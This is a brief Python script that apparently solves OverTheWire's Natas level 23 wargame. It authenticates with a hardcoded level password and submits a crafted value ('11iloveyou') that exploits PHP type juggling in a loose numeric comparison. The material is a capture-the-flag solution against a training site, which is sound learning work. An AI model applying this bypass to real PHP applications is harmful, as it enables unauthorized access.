#!/usr/bin/env python

import requests
import re

username = 'natas23'
password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()
# response = session.get(url, auth=(username, password))
response = session.post(url, auth=(username, password),
                        data={'passwd': '11iloveyou'})
content = response.text
print(content)
print('='*80)

output = open('output.html', 'w')
output.write(content)

# PHP Type Juggling
